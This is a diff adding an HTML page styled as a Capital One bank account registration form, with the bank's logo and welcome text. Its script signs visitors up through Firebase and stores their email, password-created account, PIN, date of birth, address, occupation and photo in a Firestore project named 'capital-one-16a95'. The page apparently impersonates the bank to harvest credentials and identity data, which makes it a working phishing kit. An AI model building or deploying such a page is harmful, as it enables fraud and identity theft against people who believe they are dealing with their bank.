@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Bank Account Registration Form</title>
+<style>
+  body { font-family: Arial, sans-serif; background:#f2f2f2; margin:0; padding:20px; }
+  .form-container { background:#fff; max-width:600px; margin:auto; padding:25px; border-radius:10px; box-shadow:0 2px 10px rgba(0,0,0,.2); text-align:center; }
+  h2 { margin-bottom:20px; }
+  h3 { border-bottom:1px solid #ccc; padding-bottom:5px; text-align:left; }
+  label { display:block; margin-top:15px; font-weight:600; text-align:left; }
+  input, select, textarea { width:100%; padding:10px; margin-top:5px; border-radius:5px; border:1px solid #ccc; box-sizing:border-box; }
+  .small-inputs { display:flex; gap:10px; }
+  .small-inputs input, .small-inputs select { flex:1; }
+  .radio-group { display:flex; gap:15px; margin-top:5px; }
+  .checkbox-group { margin-top:10px; text-align:left; }
+  button { margin-top:20px; background:#002868; color:#fff; padding:12px; border:none; border-radius:6px; width:100%; font-size:16px; cursor:pointer; }
+  button:hover { background:#001f5a; }
+  .description { margin:15px 0; font-size:14px; color:#333; text-align:center; }
+  .logo { max-width:150px; margin:0 auto 10px; display:block; }
+</style>
+</head>
+<body>
+<div class="form-container">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/Capital_One_logo.svg/320px-Capital_One_logo.svg.png" alt="Capital One Logo" class="logo">
+
+  <div class="description">
+    Welcome to Capital One! Please complete the registration form below to open your bank account. Ensure all information is correct and up to date.
+  </div>
+
+  <h2>Registration Form</h2>
+  <form id="bankForm">
+    <!-- Account Information -->
+    <h3>Account Information</h3>
+    <label>Account Type</label>
+    <select name="accountType" required>
+      <option value="">Please Select</option>
+      <option value="Savings">Savings Account</option>
+      <option value="Checking">Checking Account</option>
+    </select>
+
+    <label>Currency Type</label>
+    <select name="currency" required>
+      <option value="">Please Select</option>
+      <option value="USD">USD ($)</option><option value="EUR">EUR (€)</option>
+      <option value="GBP">GBP (£)</option><option value="JPY">JPY (¥)</option>
+      <option value="CAD">CAD (C$)</option><option value="AUD">AUD (A$)</option>
+      <option value="CNY">CNY (¥)</option><option value="GHS">GHS (₵)</option>
+      <option value="NGN">NGN (₦)</option><option value="ZAR">ZAR (R)</option>
+    </select>
+
+    <!-- Personal Information -->
+    <h3>Personal Information</h3>
+    <label>Email (for login)</label>
+    <input type="email" id="email" name="email" placeholder="you@example.com" required>
+
+    <label>Password (for login)</label>
+    <input type="password" id="password" name="password" placeholder="Enter password" required>
+
+    <label>Choose PIN</label>
+    <input type="number" id="pin" name="pin" placeholder="4-digit PIN" required>
+
+    <label>Name</label>
+    <div class="small-inputs">
+      <input type="text" name="prefix" placeholder="Mr / Mrs" required>
+      <input type="text" name="firstName" placeholder="First Name" required>
+      <input type="text" name="lastName" placeholder="Last Name" required>
+    </div>
+
+    <label>Phone Number</label>
+    <input type="tel" name="phone" placeholder="(000) 000-0000" required>
+
+    <label>Date of Birth</label>
+    <input type="date" name="dob" required>
+
+    <label>Residential Address</label>
+    <input type="text" name="address1" placeholder="Street Address" required>
+    <input type="text" name="address2" placeholder="Street Address Line 2">
+
+    <div class="small-inputs">
+      <input type="text" name="city" placeholder="City" required>
+      <select name="state" required>
+        <option value="">State / Province</option>
+        <option>State 1</option><option>State 2</option>
+      </select>
+    </div>
+
+    <div class="small-inputs">
+      <input type="text" name="zip" placeholder="Postal / Zip Code" required>
+      <input type="text" name="country" placeholder="Country" required>
+    </div>
+
+    <label>Citizenship</label>
+    <div class="radio-group">
+      <label><input type="radio" name="citizenship" value="US" required> US Citizen</label>
+      <label><input type="radio" name="citizenship" value="EU"> EU Citizen</label>
+      <label><input type="radio" name="citizenship" value="Other"> Other</label>
+    </div>
+
+    <label>Marital Status</label>
+    <select name="maritalStatus" required>
+      <option value="">Please Select</option>
+      <option>Single</option><option>Married</option><option>Other</option>
+    </select>
+
+    <label>Occupation</label>
+    <input type="text" name="occupation" placeholder="e.g. Software Engineer" required>
+
+    <label>Employer Name</label>
+    <input type="text" name="employer" placeholder="e.g. Google">
+
+    <!-- Upload Profile Picture -->
+    <h3>Profile Picture</h3>
+    <input type="file" id="profilePic" name="profilePic" accept="image/*" required>
+
+    <!-- Terms -->
+    <h3>Terms & Conditions</h3>
+    <div class="checkbox-group">
+      <label><input type="checkbox" required> I agree to <a href="#">terms & conditions</a></label>
+    </div>
+
+    <label>Date</label>
+    <input type="date" name="signDate" required>
+
+    <button type="submit">Register Now</button>
+  </form>
+</div>
+
+<!-- ✅ Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js"></script>
+
+<script>
+  // ✅ Firebase Config (same across all pages)
+  const firebaseConfig = {
+    apiKey: "AIzaSyCfQGrLEYcNfmYid8XvigP5ZXJh1RNoipM",
+    authDomain: "capital-one-16a95.firebaseapp.com",
+    projectId: "capital-one-16a95",
+    storageBucket: "capital-one-16a95.appspot.com",
+    messagingSenderId: "1061937867911",
+    appId: "1:1061937867911:web:347450d4e37ce73d0b5c22"
+  };
+
+  // ✅ Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  const auth = firebase.auth();
+  const db = firebase.firestore();
+  const storage = firebase.storage();
+
+  // ✅ Handle Registration
+  document.getElementById("bankForm").addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value;
+    const pin = document.getElementById("pin").value;
+
+    try {
+      // Create user in Firebase Auth
+      const cred = await auth.createUserWithEmailAndPassword(email, password);
+      const uid = cred.user.uid;
+
+      // Send email verification
+      cred.user.sendEmailVerification().catch(()=>{});
+
+      // Collect form data
+      const formData = new FormData(e.target);
+      const data = {};
+      formData.forEach((v, k) => data[k] = v);
+
+      // Upload profile picture
+      let photoURL = "";
+      const file = document.getElementById("profilePic").files[0];
+      if (file) {
+        const storageRef = storage.ref(`profilePics/${uid}_${file.name}`);
+        await storageRef.put(file);
+        photoURL = await storageRef.getDownloadURL();
+      }
+
+      // Save in Firestore
+      await db.collection("registrations").doc(uid).set({
+        ...data,
+        email,
+        pin,
+        photoURL,
+        balance: 0,
+        createdAt: firebase.firestore.FieldValue.serverTimestamp()
+      });
+
+      alert("✅ Registration successful! Redirecting...");
+      window.location.href = "dashboard.html";
+
+    } catch (err) {
+      console.error(err);
+      alert("❌ " + (err.message || "Registration failed"));
+    }
+  });
+</script>
+</body>
+      </html>
